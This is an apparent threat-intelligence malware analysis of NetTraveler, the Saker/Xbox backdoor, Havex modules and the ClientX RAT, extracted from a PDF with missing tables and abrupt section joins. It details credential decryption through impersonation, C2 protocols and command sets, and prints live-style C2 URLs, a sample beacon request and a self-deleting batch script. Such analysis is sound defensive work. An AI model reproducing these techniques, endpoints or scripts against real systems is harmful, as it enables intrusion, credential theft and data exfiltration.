Note : Other known mutexes used by variants of NetTraveler include : After that it opens % WINDIR % \system\con- fig_t.dat file and parses the following values : It creates a list of local paths in memory to work with later : If CheckedSuccess value from INI file equals 0 or does n't exist , the module will fetch additional con- figuration from the same INI file [ Other ] section : Next the module prepares some strings for test- ing the Internet connection : Ironically , the % TestURL % is a Microsoft web page about privacy , security and safety online ( last updated in January 2000 ) : After that with the help of WinInet API the mod- ule issues an HTTP GET request to % TestURL % ( see above ) and the following hardcoded HTTP header values : It sets other options such as proxy server ad- dress and port ( PS and PP values from INI file or attempts to find proxy settings automatical- ly ) , proxy username and password ( PU and PW values from the INI file ) , several connection timeouts limited with 60 seconds .
The module submits the request and reads the response of the server .
The response is stored in newly allocated memory block .
After that the malware appends debug output to the log file named < modulename > .log
.
The output messages are shown below : If the PS , PP , PU , PW parameters were not found the INI file or Autocheck value is set to 1 , the module attempts to find local proxy settings ac- cording to the procedure below .
First , the module lists contents of % PROGRAM- FILES % directory and appends the listing to the log file .
Then it opens IE history file of the current user ( History . IE5\index.dat ) parses it and appends the log with discovered logins / password saved in the the history file as a part of visited URLs .
After that the module logs current version of Internet Explorer .
Interestingly that the log file is appended with the following hard coded string : '' IE版本 : Internet Explorer `` , 版本 means `` ver- sion '' in Simplified Chinese .
The module reads IE version from HKLM\Soft- ware\Microsoft\Internet Explorer\Version reg- istry value .
Then it gets version of current OS , and again appends the result to the log file with some hard coded strings in it : '' 操作系统版本 '' which means `` version of oper- ating system '' in Simplified Chinese .
The malware is capable of interpretation of sys- tem minor / major code and recognizing the fol- lowing O Ses : It can also recognize type of OS : Professional , Server , Advanced Server and exact version and build numbers are also appended to the log file .
There were four different methods to find proxy configuration on the system according to the log file messages set in three functions .
One of the function ( method 2 ) was probably merged with another one ( method 3 ) in newer variant of the malware .
Method 1 : This is a straightforward attempt to connect to the test url , assuming that system - wide proxy settings are correct or no proxy is required to access the external website .
The URL for testing is http : //www.microsoft.com / info / privacy _ security.htm with the following header values : If the method succeeds the module appends received data from the URL to the log file and corresponding parameter is set in the INI file ( UP=0 ) .
If something fails the following message is ap- pended to the log file : `` Method1 Fail ! ! ! ! ! '' Method 2 and Method 3 : This method is used when the infected machine uses proxy server but the settings are not avail- able for local SYSTEM user .
A user working at the infected machine might have internet ac- cess and should have the required proxy server settings .
The malware list all processes running on the machine and locates process named `` EXPLOR- ER.EXE '' .
This process is a system shell which is normally running after local user successfully authenticates and logs in to the system .
The malware finds explorer process and obtains se- curity token which is later used to temporarily impersonate as local user and get proxy con- figuration with InternetQueryOptionA ( 0 , INTER- NET_OPTION_PROXY , ...
) API call .
If the result contains proxy settings the malware gets them .
If for some reason local proxy set- tings were not found in current user profile , the malware attempts to double - check and opens IE settings in the registry .
The following registry values are checked : After that the malware first obtains the IE stored credentials .
It iterates through all stored local user secrets via CredEnumerateA and looks for those which start with `` Microsoft_WinInet _ '' and contain the address of the proxy server previ- ously obtained .
These secrets are decrypted with CryptUnprotectData API call .
Such call is possible only after impersonation as local user which is available for the malware running with local system privileges .
This method checks the first available password in the list of passwords from the system stored secrets .
Once the potential server , port , login and pass- word are obtained the malware makes a test query to the same URL : http : //www.microsoft .
com / info / privacy_security.htm .
If it succeeds the content of this page is appended to the log file with all details about the proxy server .
If the method fails it prints the following line in the log file : `` Method3 Fail ! ! ! ! ! '' Method 4 : This method is identical to Method 3 with just one difference : it checks the last available pass- word in the list of passwords from the system stored secrets .
Method X ( debug ) : There is also an unused method in the code with no internal number , which was most likely used to debug the application as it writes all interme- diate results to the log file , starting from string '' Get From IEOption ! '' or `` Get From Reg ! '' de- pending on the path of code execution .
If the malware failed to locate the proxy server it unregisters current malicious service by deleting corresponding registry keys in HKLM\System\ CurrentControlSet\ < servicename > \ and at- tempts to delete all related files from the fol- lowing list : Otherwise , if the proxy was checked successful- ly the malware writes the following value to the config file ( config_t.dat ) : After that the module sleeps for 60 seconds and starts a new thread ( see below Thread1 ) , sleeps 10 more seconds and creates another thread ( see below Thread2 ) .
Right after that it enters an infinite loop of doing nothing but sleeping which can be interrupted by a special value in global variable set by other threads .
Upon detecting this value the service routine ends which termi- nates the service execution .
Thread1 ( Command and Control Thread ) This thread starts from collecting local system information , including the following : This information is stored in a text buffer with Chinese comments like shown below ( transla- tion is added in red ) : Physical Memory : Total physical memory : * * * MB of available memory : * * * MB ( * * .
* * % ) C & C Communication This information is saved in % WINDIR % \Sys tem32\system_t.dll text file .
This file is read a moment later , compressed using a custom Lempel - Ziv - based algorithm , encoded with a modified Base64 encoding and uploaded to the C & C server using HTTP GET request of the fol- lowing format : If the file upload is successful , the module de- letes the `` system_t.dll '' file .
Please note that the serial number of current disk drive ( most likely it is drive `` C '' ) is used in HTTP query value hostid .
This identifier derived from the local filesystem is used later as a reliable identifier of current infected machine or simply BotId .
The Control Loop After that it enters control loop .
Every 10 minutes according to the DownCmdTime parameter val- ue in the config file , it sends HTTP GET request of the following format : The module expects server to reply `` Success '' .
If it does n't the module will try again in 10 minutes .
If the server was notified and confirmed receiv- ing the notification , the module reads stat_t .
ini file which is just another config in INI format : All values d < number > from stat_t.ini file are read and the corresponding local directory and sub- directories listings are collected and appended to the dnlist.ini file in the format : [ Filelist ] f1= < string > f2= < string > f3= < string > … The following values from stat_t.ini file are also transferred to the dnlist.ini file : This is clearly the functionality which lets the attacker download specific files or even full di- rectories including all subdirectories contents basing on defined file search criterias , such as file extensions .
Filesystem Scan The malware has a file enumeration routine , which gets the settings from dnlist.ini ( such as directory paths to process ) and launches a re- cursive directory search .
The output is saved to enumfs.ini file in the following format : After execution , this log file contains directories with all filenames and subdirectories .
Only di- rectory / file names are stored , with no addition- al data such as timestamps or size .
When the search is finished , the module saves current date to the dnlist.ini file and changes option ScanAll , see format below .
This is done to avoid recurrent scanning of the filesystem , which is normally a heavy process and might be noticed by local user or an administrator .
After scanning the local filesystem , enumfs .
ini file is uploaded to the server via HTTP GET request described above ( see the submission process of stat_t.ini file in the beginning of C & C Communication part ) with filename of the fol- lowing format : Uploading Files The next stage of this thread uploads files inter- esting for the attacker to the C & C server .
This process is described below .
The module works with files described in dnlist .
ini file .
It gets a list of file extensions that must be uploaded to the C & C first .
There is a default list of extensions ( value Types of section [ Oth- er ] ) that represent interest for the attackers : doc , docx , xls , xlsx , txt , rtf , pdf .
Then it gets file- total values from [ FileList ] section of dnlist.ini and iterates through every f < N > value , where N is a positive integer starting from 1 .
There are several tests applied to each file , be- fore it is uploaded to the server , including the following : If the file matches the criterias , then a unique file state identifier for that file is created , which is an MD5 hash of the following string : '' < Filename > < Year > - < Month > - < Day > < Hour > : < Minute > : < Second > : < Millisec- onds > '' .
The date and time values in the string before are obtained from the file last change time .
After that the module creates a name used for uploading the file to the server , which consists of the following : `` < Year > - < Month > - < Day > - < Hour > - < Minute > - < File state identifier , the MD5 > '' .
The time and date values are also taken from the file 's last change time .
This file is up- loaded to the C & C using the same procedure as used before for uploading other files .
After that , Thread1 attempts to upload a file called uenumfs.ini , which is created by the Thread2 .
The remote filename is set to the following `` UFileL- ist- < Month > < Day > - < Hour > < Minute > < Sec- ond > .ini
'' .
Next , the thread iterates through % TEMP % \ ntvba00.tmp\ directory and uploads every file located there .
The file names are preserved as they are .
Control Procedure Then , the thread issues a special HTTP GET re- quest to get next control instruction from the C & C .
This is done by accessing the following URI : Server response is converted to uppercase and analyzed .
There is defined set of responses ex- pected from the C & C server : This command simply uninstalls the malicious service from the registry and deletes locally cre- ated files .
This procedure starts from uninstalling current service , then it issues three HTTP GET requests to the C & C script URL : This procedure simply removes all temporary files , such as the following : This procedure is identical to the UPDATE com- mand described before with one difference - no uninstallation of the current module is done , only new executable is downloaded and started .
This method is probably used to execute additional independent malicious executable , unrelated to the original NetTraveler malware .
Or it can be used to infect with the NetTraveler backdoor configured for some other C & C server .
After processing any of the commands above the malware issues the following request to the server to confirm command execution : If the server has n't issued the UNINSTALL com- mand the thread continues execution starting from the beginning of The Control Loop ( see above ) .
This thread creates a hidden window with class name `` NTMainWndClass '' and processes win- dow messages in a loop until it is interrupted by special variable value .
The window procedure processes only one window message , WM_DE- VICECHANGE with wParam value set to DBT _ DEVICEARRIVAL , which is sent by the system when a new removable device such as USB flash drive or Network shared folder is attached to the system .
The module will proceed only if the attached removable device has provided a disk volume .
It is designed to have different procedures for removable disk drives from USB flash and net- work shares .
The USB drives will be processed only if GSearch value is set to True in [ Other ] section of dnlist .
ini file .
Similarly , a new network drive will be processed only if USearch value is set to True in [ Other ] section of dnlist.ini file .
Both network and removable USB drives are processed in the same procedure , which reads the following values from dnlist.ini file : If UAuto option is set to True , the thread creates % TEMP % \ntvba00.tmp\ directory and opens uenumfs.ini file for writing .
The latter is filled with directories and subdirectories listings of the attached disk drive .
The format of the data in uenumfs.ini is almost identical to the one created during fixed drive filesystem scan ( see `` Filesys- tem Scan '' part in Thread1 description above ) .
In addition to that , the same criterias are applied to each file ( size and file extension ) as in fixed drive filesystem scan .
Also , every file gets a state i d calculated as MD5 hash of the filename and timestamp of the last modification .
This hash is used to generate a new filepath in the follow- ing format : % TEMP % \ntvba00.tmp\ < Year > - < Month > - < Day > - < Hour > - < Minute > - < File state i d , MD5 hexadecimal string > .
< Original extension > .
The source file from newly attached drive is then copied to the destination set by the generated file path .
Please note , that the file orig- inal extension is preserved , while the file name is changed .
That is used to prevent further problems when working with unsupported encoding .
At the same time when file is copied to ntvba00 .
tmp directory , a record is added to udxidx.ini file , which has the following format : This is done to avoid copying files that were al- ready copied before , unless they were changed by the user .
To avoid excessive use of the disk drive and oc- casional interest of the local user , the file copy- ing procedure has a delay .
Every 1000 files the thread delays execution and sleeps for 9 sec- onds .
Useless text transformation In function which gets disk volume serial num- ber the actual serial number is converted from a decimal integer to a hexadecimal number stored as an ASCII string .
The integer is converted to a string with call to the `` sprintf ' function and '' % 8X '' parameter which outputs 8 characters representing a number in hexadecimal form .
Despite the fact that the output of this call is in uppercase , the author of the module converts the output to uppercase characters again .
This could be due to the fact that the author used to have `` % 8x '' format string before , which made such conversion rational .
However , that clearly shows that the developer was n't aware of vari- ous format strings options , which shows lack of experience in C / C++ development .
Drive monitoring disk processing issue As we mentioned above the drive monitoring thread uses the same function to process removable USB drives and network shares attached as local drives .
Visible separation of these two types of disk drives ( in the name of the options GSearch and USearch , where `` U '' probably stands for `` USB '' and `` G '' is for `` Glob- al '' , and in separate logical branches of code flow ) is later misused , as the drive processing routines is bound to USB drives .
At least it read U - prefixed options from dnlist.ini file , which logically corresponds to the USB - type of disk drive , but used for both .
While this is a minor issue and probably did n't cause a serious problem for the attackers , this shows that the developer felt lazy at some point and used Copy and Paste approach to avoid creating extra code .
It could also mean that one part of the code was created by one person and later modified by another , who mistakenly over- looked general code design .
Data decompression routine The malware uses a custom data compres- sion algorithm when uploading files to the C & C server .
While the decompression is not required for the work of the application , the code for the decompression routine was also found in the malicious module .
This clearly indicates a design flaw and shows that the de- veloper did n't review the code on a binary level after it was compiled , which is common among beginners among malware authors and quite widespread among common software develop- ers .
' Saker ' ( ' Xbox ' ) Dropper and Loader The module is non - packed Win32 PE executable file compiled in Microsoft Visual C++ 6.0 .
Al- though no encryption or compression is used to protect or hide parts of the code , simple obfus- cation is applied to internal strings .
The module main purpose is to install and embedded DLL file or load it during system startup .
Execution of the main function starts with ob- taining local user Startup directory .
This path is appended with `` \service.lnk '' .
The strings , which are used in the application are stored in simple obfuscated form .
For example , the `` Kaspersky Lab '' is stored as `` K.sp4r6ky aa , '' .
The 1 , 4 , 6 , 10 and 12 characters are re- placed with hardcoded character constants as shown below : Then the module gets local % TEMP % folder path and constructs paths `` % TEMP % \service.dll '' and `` % TEMP % \service.exe '' .
After that the code checks if the current module file name is called `` service.exe '' .
If current module is not called `` service.exe '' , the module copies itself to `` % TMP % \service .
exe '' and creates corresponding LNK file in lo- cal user 's startup folder pointing to the freshly created executable .
The executable file is as- signed an attribute `` hidden '' and started in a new process .
Then the module checks if Kasper- sky products are installed on local system by iterating through % PROGRAMFILES % directory and looking for `` Kaspersky Lab '' subdirectory .
If it finds Kaspersky products it quickly exits , if not it attempts to self - delete by running `` cmd.exe /c del < ModuleName > '' and then exits .
If the module was already installed in the system and is called `` service.exe '' , it checks if system mu- tex object called `` SECUT ! '' already exists and exits if it 's true .
This is done to avoid multiple instances of the module from running simultaneously .
After that , the module creates a new file at '' % TEMP % \service.dll '' and saves a part of own data to the new file .
The data offset is hardcoded as a string `` 46592 '' .
Next , it attempts to load the `` % TEMP % \service .
dll '' library file and call export function named '' JustTempFun '' .
After that the module enters an infinite sleep loop . ' The module is a non - packed Win32 DLL exe- cutable file compiled in Microsoft Visual C++ 6.0 .
Although no encryption or compression is used to protect or hide parts of the code , simple obfuscation is applied to internal strings .
The module is to clearly a backdoor application that enables an attacker to manage files , get infor- mation about local disk drives , download and start new executables .
This backdoor is probably authored by the same developer who created the Gh0st / Zegost RAT .
This module has 2 export functions : JustTemp- Fun and ServiceMain .
Module main function as well as ServiceMain are empty procedures .
So far , all functionality of the module is located in JustTempFun function .
Meanwhile , there is another known malicious DLL which has exactly these export names - Gh0st RAT , that was also developed by Chinese .
When this module is loaded with Xbox Loader described above execution is started with Just- TempFun exported function .
This function begins with deobfuscation of the strings used further : pitgay.minidns.net 8090BBBBBBBBBBBB GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG SakerEvent FFFFFFFFFFFFFFFF Proxy HHHHHHHHHHHHHHHH Obviously pitgay.minidns.net is the C & C server domain name .
8090 is the port the malware con- nects to .
As for the `` GGG ...
'' , `` FFF ...
'' and `` HHH ...
'' strings , according to the further code analysis they are used as a placeholders for the hardcode proxy settings : The `` FFF ...
'' placeholder may contain `` Proxy '' string instead of `` F '' sequence which works as a flag to use the proxy settings from the `` GGG ...
'' placeholder in the form that wininet accepts ( according to MSDN , the format is `` http = http : // http_proxy other '' ) .
The `` HHH ...
'' placeholder is for proxy username and password .
The thread collects information about the local system , such as > > OS version > > CPU type > > Used and available memory > > Local system name > > Used and available disk space of the drive C : \ The last value is converted to a hexstring of 8 characters and XOR - ed with current computer name .
The purpose of this value is unclear .
Then the information collected before is encrypt- ed using simple string obfuscation algorithm , shown below in a pseudo code : This algorithm not only adds obfuscation but also adds some redundancy , which doubles the size of the input string .
The module attempts to connect to a C & C server and issue using the following URL : http : //pitgay.minidns.net:8090/3010 ...
Also , it uses a hardcoded User - Agent string .
There is not query string parameters , the data is transferred in a form of CGI path consisting of hex numbers only and prefixed with 3010 , which makes such requests rather unique .
3010 most likely defines client request ID .
Here is how a request may look : GET /301000000000F0FD ...
0000000000000000000 000000 HTTP/1.1 User - Agent : Mozilla/4.0 ( compatible ; MSIE 6.0 ; Win- dows NT 5.0 ; .NET
CLR 1.1.4322 ) Host : tsgoogoo.net Host : pitgay.minidns.net:8090 Cache - Control : no - cache The module checks the server response code and if that is HTTP 200 , it reads 2 DWORD values ( lets call them ParamA and ParamB ) from the the server response .
The first DWORD ( ParamA ) defines the command and following execution path .
Below is the inte- ger values and commands description : 1020 : Shutdown 1021 : Shutdown Both 1020 and 1021 commands are used to interrupt execution of the module and terminate the main thread .
The module also sets local thread privileges to enable global system shut- down , however this is not used later and proba- bly represents some remains of the code written earlier or another variant of the code .
This is also confirmed by by the shutdown procedure exe- cuted afterwards , which is designed to disable Windows hook mechanism while it was n't used previously anywhere in the code .
1022 : Self - remove This command is used to self - remove current module and stop its execution .
It attempts to create a local batch file named del.bat with the following contents and run it : @ echo off ping /n 5 127.0.0.1 > nul > nul del /f / s / q / a < CurrentModuleDir > \service.exe > nul del /f / s / q / a < CurrentModuleDir > \service.dll > nul del % 0 /s / q / a / f del.bat Please note non - standard way to call Windows command line interpreter which starts from re- direction of output to NUL virtual device .
Also , the command arguments are not separated with space or tab characters , and it might look invalid , however cmd.exe on Windows XP , Windows 7 and Windows 8 executed it correctly without a problem .
1029 : File manager The command spawns a new thread which opens a new session with the server to provide file management operations .
The new thread makes 2 HTTP Get requests to the server , which are identical to the 3010 request described above .
The only difference is the request ID , which is 4001 and 4002 for the first and second requests correspondingly .
The output of the 4001 request is ignored , while request 4002 is interpreted .
The server response contains 2 DWORD values : lets call them FileCmdId and DataSize .
if Data- Size is non - zero the module fetches additional data which length is specified in the DataSize option .
The FileCmdId defines which operation must be executed .
It can be one of the following values : 5001 : Get drive information .
Provides informa- tion about specified disk drive : free space , drive type .
Client command success code is 0 , error code is 7004 .
5002 : Get file information .
Provides information about specified file : file times , attributes .
Client command success code is 0 , error code is 7003 .
5003 : Get directory information .
Provides information about specified directory : directory times , attributes , full size .
Client command suc- cess code is 0 , error code is 7003 .
5004 : Get directory listing .
Provide simple di- rectory listing , which includes file names , sizes , last write time .
Client command success code is 0 , error code is 7001 .
5006 : Create directory .
Create a new directory , which full path is provided by the server .
Client command success code is 0 , error code is 7016 .
5008 : List drives .
List available disk drives with information about free space .
Client command success code is 0 , error code is not defined .
5009 : Run application .
Run local application with path and command line arguments passed from the server .
Client command success code is 0 , error code is 7005 .
5017 : Get recursive directory listing .
Provide recursive directory listing .
Client command suc- cess code is 0 , error code is 7000 .
5025 : Run pushed executable .
This command is used to save file pushed by the server and run instantly .
When this command is received the module checks if it can create a new file , which name is passed by the server response .
If it fails it submits error code 7003 .
Then it spawns a new thread which issues a new HTTP Post request with command i d 3005 and system in- formation attached in the CGI Path .
The request of the server should contain file data to write to the already opened file and execute right away .
5026 : Upload file to the server .
The command is used to read local file and transfer it to the server .
It gets file information , including time- stamps and size and spawns a new thread .
If any of those operations fails the module reports er- ror code 7003 to the server .
Otherwise it reports success code 0 and spawns a new thread .
The new thread reads the file specified in the request and uploads it to the server .
1039 : Download and run new module .
The module uses ParamB as an integer value indicating a length of a string to read next from the server response .
The received string will be used as a NewFilename .
Then it reads another DWORD value from the server response and interprets it as a size of the following data to read .
After that a new directory `` Internet Ex- plorer '' is created in the directory of the current running module .
Then the module creates a new file using the value NewFilename pushed by the server .
The module makes 2 attempts to start a new process : by calling CreateProcessA system API and ShellExecuteA if the previous call failed .
The code was designed to support more com- mands ( 1028 , 1029 , 1032 , 1033 , 1034 , 1035 , 1036 ) , however they are now falling into com- mand 1029 handler and then ignored .
We cre- ated a chart showing a tree of commands de- pendencies : The execution of this command processing thread continues in a loop until it is interrupt- ed by Shutdown command coming from the server .
The code starts new loop iteration after hardcoded value of 30 seconds .
C : \ProgramData\Mail\MailAg\scs.txt The 2nd stage modules are usually base64 encoded , bzip2 compressed and XORed using the recurrent `` 1312312 '' key .
In some cases , the malware can also use one 1024 bit RSA key which is embedded in the config section of the binary .
IMPORTANT : For versions 03 - 0E , 010 , 011 , 015 , 016 , 023 , 026 - 028 , 02A-02F , and 031 - 036 no samples are known at the moment .
It seems there are over 50 different versions of Havex malware , internally identified by hex numbers from 01 to 044 ( the latest known at the time of writing ) .
Versions 01 – 019 : Contain strings that may be related to password harvesting , even though the code that would actually search for the passwords was not identified inside this component .
It 's possible that these strings are part of the configuration and are used by downloaded modules as a list of names of processes that the malware wants to hijack in order to steal passwords from the memory .
Versions 017 – 037 : Instead of the GET request , send a POST request to the C2 .
The contents of the POST differ between versions .
Versions 01A – 038 : Check proxy settings in the registry and use them if required .
Versions 01B – 044 : Use an asymmetric crypto algorithm ( RSA ) to decrypt the downloaded binaries .
( Previous versions use simple XOR based encryption ) .
Versions 020 – 025 : Check the Internet connection by trying to connect to google.com : CONNECT google.com:80 HTTP/1.0 Collect system information , write it to * .yls file .
Later , append these contents to the POST request string .
Version 025 : Contains a debugging symbols path , which may suggest that the project was internally called `` PhalangX '' : d : \Workspace\PhalangX 3D\Src\Build\Release\Phalanx-3d . ServerAgent.pdb Version 038 – 040 : Does not contain the routine that collects system info , yet the malware checks for potential previously created * .yls files , and appends the content of them to the POST request .
Instead of values hardcoded in the binary , this is a first version to use a resource to store encrypted config .
Detailed analysis of this version is included in this appendix .
Version 043 – 044 : Size similar to 037 and earlier versions ; dll name is now 0XX.dll ( where XX is version number ) , the < unk > value in config is now 29 bytes long .
Main characteristics : All currently known samples are completely identical in terms of code and differ only in the content of the resource .
This module looks for outlook.nk2 files , gets the contact data from inside them and writes it to the * .yls file .
Data is as always bzip2 compressed and 3DES encrypted .
Config is stored in the resource HYT 017D ( bzip2 compressed and encrypted with same xor key as always ) .
Config consists of an RSA key ID ( 29 bytes ) , base 64 bit encodedRSA key ( 1024 bit ) and nk2 file path ( 39 bytes ) .
outlook.nk2is the file where Outlook < = 2007 stores contacts details in order to use them in its AutoComplete feature .
This module collects the same type of information about the system as Havex versions 020 - 025 .
This functionality is not present in versions > = 026 - it was probably moved into this separate module around that time .
This module is used to decrypt and execute the binary that comes in the resource .
The EXE file is saved in % TEMP % \ < rand > .exe
and run using ShellExecuteExW .
Besides the binary , resource HAJ 3A0 contains hex string : 30 0A 30 0A 34 38 36 34 30 0A This PE EXE file was dropped and run by EXE dropper module ( 2120c3a30870921ab5e0314 6a1a1a865dd24a2b5e6f0138bf9f2ebf02d490850 ) .
Its main functionality is to scan the local network looking for machines listening on specified ports .
All information is logged into a % TEMP % \~tracedscn.yls file in plain text .
This module is used to decompress ( bzip2 ) and drop a password dumping tool from resource DLL1 A8 409 to % TEMP % \bp.exe and run it with the following command : % TEMP % \bp.exe % TEMP % \~tmp1237.txt '' Saved log is then copied to % TEMP % \ < rand > .tmp.yls
file .
This file was dropped and executed by the PSW dropper module ( 71e05babc107f5e52f1a4c3ea6261 c472d2649c0b179395304c420eaa54e2062 ) .
This is a customized ( ? ) version of BrowserPasswordDecryptor 2.0 - a free password recovery tool , developed by SecurityXploded : Browser Password Decryptor is the FREE software to instantly recover website login passwords stored by popular web browsers .
Currently it can recover saved login passwords from following browsers : • Instantly decrypt and recover stored encrypted passwords from popular web browsers .
• Right Click Context Menu to quickly copy the password • Recover password of any length and complexity .
• Automatically discovers all supported Applications and recovers all the stored passwords .
• Sort feature to arrange the recovered passwords in various order to make it easier to search through 100 's of entries .
• Save the recovered password list to HTML / XML / Text / CSV file • Easier and faster to use with its enhanced user friendly GUI interface .
• Support for local Installation and uninstallation of the software .
Each module is capable of creating a log file ( .yls
) which is encrypted and stored on disk .
The encryption library used by the modules ( as well as the most recent versions of Havex ) is handled by the RSAeuro library .
They recompiled the library several times using different compiler settings and optimization ( depending of modules / Havex ) which makes fingerprinting the functions a bit tedious .
Once the log has been compressed using bzip2 , the modules use the library to generate a random 192 bit 3DES key ( 168 bit effective ) and a 64 bit Initialization Vector .
The function used to do so is R_GenerateBytes which is using the MD5 algorithm previously seeded by the R_RandomCreate function ( Also using MD5 ) : Once the key and the IV have been generated , the 3DES algorithm is initialized : Once 3DES is initialized , the next step is to RSA encrypt the 3DES KEY using the RSAPublicEncrypt function .
It is essentially creating the PKCS # 1 padding block around the key and then calling the rsapublicencrypt function .
Example of a layout where 0x42 is the PKCS # 1 padding block and 0x41 the 3DES key ( original values overwritten for clarification purpose ) : The rsapublicencrypt is basically a wrapper to various big num functions used to compute RSA : N parameter in one sample : The E parameter is the standard 0x10001 After the 3DES key is encrypted using RSA , the log files are encrypted .
The final encrypted log file layout looks like the following : ( important parameters overwritten for clarity ) : The YLS file format can be described as follows : • SIZE OF RSA Identifier : 0x29 in the figure above • RSA ID : `` 39ee448cf196304cfe9c6b1c2e436 '' .
( Used by attackers to identify which RSA key was used to encrypt the 3DES Key .
• BLOCKSIZE : 128 bytes ( 24 bytes from 3DES key and 104 from PKCS padding block ) • ENCRYPTED 3DES KEY : In yellow on the figure above , replaced by `` C '' • 3DES Initialization Vector : In red on the figure above , replaced by `` I '' .
Mandatory to decrypt logs .
• 3DES ENCRYPTED LOG bytes Only the attackers can decrypt such a log file .
They can identify which Public RSA Key was used from the identifier , and decrypt the 3DES key using their Private RSA Key .
From there , they can use the 3DES Key and the Initialization Vector which is present in clear form to decrypt the log file .
SHA-256 : 170e5eb004357dfce6b41de8637e1dbeb87fa58e8b54a2031aac33afb930f3c8 Size : 226304 Compiled : We d , 28 Sep 2011 07:36:00 UTC C2 urls : onemillionfiles.com/server_package/system/application/controllers/list.php ? id= www.autoyoung.com/system/ext/Smarty/plugins/function.search.php ? id= All binaries have basically the same functionality - they serve as downloaders for other malicious code .
The ClientX backdoor binaries were found in an open directory on one of the C2 servers .
They consist of two .NET
files .
One of them is called client.exe , which is the main malware component .
The second is library.dll , which provides functions to client.exe .
The client.exe file has built - in debug messages , but the binary was compiled as a GUI application .
By editing the PE header , it is possible to change it back to console , and see real time debug messages as the malware operates : Here is what is displayed upon execution : Upon execution , client.exe starts by sleeping for 10 seconds .
It then creates a Mutext called `` clientX '' to check whether other instances of the malware are already running .
If no other instance of the malware is found , it will write `` One instance '' and continue execution .
Otherwise , it will print out '' More than one instance '' and terminate .
Immediately after creating the Mutex the `` cleaner '' method is called .
( Debug message : `` upd cleaner '' ) .
This method looks for all executables in the current folder and deletes files with names that do not match some file property criteria .
This is used to delete older versions of the RAT after a successful update ( See the commands UPD later described in this appendix ) The backdoor then starts the main loop , which is an infinite while loop .
( Debug message : `` main loop '' ) .
Some settings are checked by the backdoor .
( Debug message : `` setting check '' ) The Settings Check method from the check class is used .
After the debug message `` RegIeDir '' , the following registry key is opened `` HKEY_CURRENT_USER\\ SOFTWARE\\Microsoft\\Internet Explorer '' and the subkey `` InternetRegistry '' is checked .
If not found , a subkey is created .
That part is closed by a debug message : `` RegIeDir done '' .
The `` run - work '' debug message indicates that the malware is gathering two registry keys for later use .
There is a structure named `` prSettings '' with the following fields : The last two fields `` prSettings . KeyRun '' and `` prSettings . KeyWork '' are the one filled by `` run - work '' .
`` KeyRun '' will hold `` SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run '' , either from '' HKEY_LOCAL_MACHINE '' or `` HKEY_CURRENT_USER '' depending on access rights .
`` KeyWork '' will hold `` SOFTWARE\\Microsoft\\Windows\\CurrentVersion '' , either from `` HKEY _ LOCAL_MACHINE '' or `` HKEY_CURRENT_USER '' depending on access rights .
The `` CheckAccessLM '' and `` CheckAccessCU '' methods check for access to Local Machine and Current User , respectively .
If the LOCAL MACHINE is n't accessible the following error message is displayed `` LM error : error reason '' , otherwise `` LM no error '' .
If the CURRENT MACHINE is n't accessible the following error message is displayed `` CU error : error reason '' , otherwise `` CU no error '' .
If for some reason , neither `` SOFTWARE\\Microsoft\\Windows\\CurrentVersion '' from Local Machine nor Current User is accessible , the following '' HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Internet Explorer\\InternetRegistry '' will be used for `` KeyWork '' .
Once the registry keys are identified , the debug message `` run - work done '' is displayed .
The malware prints both KeyRun and Keywork and continues execution .
A subkey is added to KeyRun to automatically start the malware when Windows reboots .
The name of that subkey comes from the `` version information '' entry of the resource section where the internal and original file name can be found .
The full path of the malware is set and the malware can now survive reboot .
The debug message '' work '' is displayed .
The next step focuses on the Keywork registry key .
The following subkeys are checked and created if not present in Keywork\\ [ name_from_version _ information ] : `` done '' , `` doneEXT '' , `` work '' , `` settings '' and `` servers '' .
They hold not any value at this point .
This part is ended by a debug message : `` run - work done 2 '' Immediately after checking for special subkeys , the IDget method is called .
If the `` i d '' subkey does n't exist , the method IDset is called and a new BOTID is created and stored as a Base64 encoded string .
Afterwards , the IDget method is called and the BOTID is Base64 decoded from the registry and saved for later use in prSettings.id .
It does the same for `` prSettings.priv '' , `` prSettings.pub '' , `` prSettings.timeout '' and `` prSettings .
servers '' , each time checking whether a value is already set , and creating one if not .
The developers made a mistake .
The `` prSettings.priv '' is set using the IDget method instead of the KeyPrivGet method .
However , this makes little difference since KeyPubGet , KeyPrivGet and IDget are wrappers to the GenerateID methods .
This could have introduced a serious flaw if those parameters were used in a secure scheme : Once it is done filling the prSettings structure , the debug message `` settingcheck done '' is displayed .
The next method called by our trojan is `` AnsSend '' .
It stands for `` Answer Send '' .
It starts with the debug message `` ANSWER '' .
This part of the code looks into the registry , specifically into the `` KeyWork\\ [ name_from_version _ information ] \\done '' and doneEXT subkeys to see if there is anything ready to be posted to the C & C server .
Those subkeys should be empty at this stage , since the Answers are only created after a task received from the C & C server is completed .
Should answers be available , their numbers would be printed as a debug message and processed and the following would be displayed as a debug message : This essentially does a POST request to the C & C server using the BOTID and the following User Agent : `` Mozilla/5.0 ( Windows NT 6.1 ; rv:5.0 ) Gecko/20100101 Firefox/5.0 '' On the C & C server side , a new file would be created named after the BOTID with the extension '' .ans
'' .
Here is an example of such a file : The date of the post can be found , the base64 encoded C & C server and the unicode string Answer , modified in this example .
This is how the attackers get an answer ( result ) from a given task .
The WorkReceive function essentially does a GET request on the C & C server in order to receive a task to complete on the infected computer .
The task to execute is encrypted and base64 encoded and returned between the `` havex '' tags .
Here is an example without any task between the tags : The trojan calls the DataParser to locate the task : The task is decrypted , decoded and stored in the `` KeyWork\\ [ name_from_version_information ] \\ work '' subkey .
Just before the WorkBegin method is called , the `` begin work '' debug message is displayed .
The first thing WorkBegin does is decrypt and unbase64 the answer returned from the DataParser .
Afterwards , two things are extracted : The command to execute and the data parameter for the command .
The final step calls the command dispatcher , which executes the command sent by the attackers .
The `` SCR '' command is used by the attacker to request a Screen Capture of the infected computer .
Typical GDI functions are used , including : CreateCompatibleDC , GetSystemMetrics and CreateCompatibleBitmap .
The screenshots are made as JPG files .
If a screenshot already exist , it is deleted prior the creation of a new one .
The `` DIR '' and `` DIS '' commands are used to generate Directory listings using the XML format .
The TIM command is responsible for updating the Timeout parameter in the registry .
The command finds where the KeyWork is located and updates the Time out with the parameter provided to the command .
The UPD command is used to run an updated version of the RAT .
The currently running RAT executes the update and exits .
Upon execution , the newly updated version will delete the old RAT using the Cleaner method described earlier .
Change Folder attributes .
The LIB command is used to load a DLL on the infected machine .
It simply uses LoadLibrary .
The FIR command is used to run an executable on the infected computer .
The process is created with hidden windows to stay unnoticed .
